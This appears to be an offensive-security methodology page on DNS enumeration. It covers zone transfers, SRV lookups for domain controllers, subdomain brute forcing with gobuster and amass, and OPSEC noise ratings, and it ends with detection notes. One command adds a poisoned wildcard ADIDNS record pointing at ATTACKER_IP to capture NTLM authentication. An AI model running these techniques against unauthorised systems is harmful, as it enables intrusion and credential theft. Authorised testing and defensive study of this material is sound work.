# DNS Enumeration

tags: dns, enumeration, zone-transfer, subdomain, brute-force, amass, gobuster, dig, adidns, srv, domain-controller

## Objective
Enumerate DNS records, discover subdomains, identify domain controllers via SRV records, and exploit DNS misconfigurations.

## Prerequisites
- Target domain name known
- Network access to DNS server (port 53)

## Methodology

### Zone Transfer Attempt (OPSEC: 0.3)
```bash
# Zone transfer — reveals all DNS records if permitted
dig AXFR domain.com @ns1.domain.com
```

### DNS Record Enumeration
```bash
# All record types
dig domain.com ANY +noall +answer

# Specific record types
dig domain.com MX +short
dig domain.com TXT +short
dig domain.com NS +short

# Find Domain Controllers via SRV records
dig _ldap._tcp.domain.com SRV

# Find KDCs
dig _kerberos._tcp.domain.com SRV
```

### Subdomain Brute Forcing
```bash
# Gobuster DNS brute force (OPSEC: 0.6)
gobuster dns -d domain.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# Amass passive — no direct queries (OPSEC: 0.1)
amass enum -d domain.com -passive

# Amass active brute force (OPSEC: 0.6)
amass enum -d domain.com -brute
```

### ADIDNS Poisoning (requires domain creds)
```bash
# Create wildcard record → captures NTLM auth for non-existent hostnames (OPSEC: 0.5)
python3 dnstool.py -u 'domain\user' -p 'pass' -a add \
  -r '*.domain.com' -d ATTACKER_IP DC_IP
```

## Graph Reporting
- **Domain nodes**: linked to host nodes via DNS resolution
- **Host nodes**: with hostname property enriched from DNS
- **SRV records**: identify DCs (Kerberos/88, LDAP/389), mail servers
- **RELAY_TARGET edges**: from ADIDNS poisoning targets
- **REACHABLE edges**: between discovered hosts

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| Zone transfer | 0.3 |
| DNS record queries | 0.2 |
| Passive subdomain enum | 0.1 |
| Active brute forcing | 0.6 |
| ADIDNS poisoning | 0.5 |

**Detection**: DNS query logs for AXFR attempts, high-volume DNS queries from single source, wildcard record creation in AD-integrated DNS.

## Sequencing
- **After**: Network Recon (identifies DNS servers)
- **Feeds →**: AD Discovery, SMB Enumeration, Web Reconnaissance
